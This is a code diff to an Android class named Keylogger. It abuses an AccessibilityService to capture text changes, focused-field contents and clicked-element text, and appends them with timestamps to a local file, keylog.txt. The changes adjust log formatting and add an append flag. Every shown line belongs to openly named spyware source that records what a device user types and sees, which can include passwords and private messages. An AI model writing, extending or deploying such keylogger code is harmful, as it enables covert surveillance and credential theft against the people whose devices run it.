@@ -13,6 +13,7 @@ public class Keylogger extends AccessibilityService {
 
     private static String TAG="Keylogger";
     private String fileName="keylog.txt";
+    private boolean append = true; //Default true
 
     @Override
     public void onServiceConnected() {
@@ -32,19 +33,20 @@ public class Keylogger extends AccessibilityService {
             case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED: {
                 Log.d(TAG,"Text changed!");
                 String data = event.getText().toString();
-                fileIO.saveToFile(fileName,(time + "|(TEXT)|" + data));
+                fileIO.saveToFile(fileName, (time + " TEXT: " + data),append);
                 break;
             }
             case AccessibilityEvent.TYPE_VIEW_FOCUSED: {
                 Log.d(TAG,"Text focused!");
                 String data = event.getText().toString();
-                fileIO.saveToFile(fileName,(time + "|(FOCUSED)|" + data));
+                //fileIO.saveToFile(fileName,(time + "|(FOCUSED)|" + data));
+                fileIO.saveToFile(fileName, (time + " " + data ),append);
                 break;
             }
             case AccessibilityEvent.TYPE_VIEW_CLICKED: {
                 Log.d(TAG,"Text clicked!");
                 String data = event.getText().toString();
-                fileIO.saveToFile(fileName,(time + "|(CLICKED)|" + data));
+                fileIO.saveToFile(fileName, (time + " CLICKED: " + data),append);
                 break;
             }
             default:
@@ -54,6 +56,5 @@ public class Keylogger extends AccessibilityService {
 
     @Override
     public void onInterrupt() {
-
     }
 }
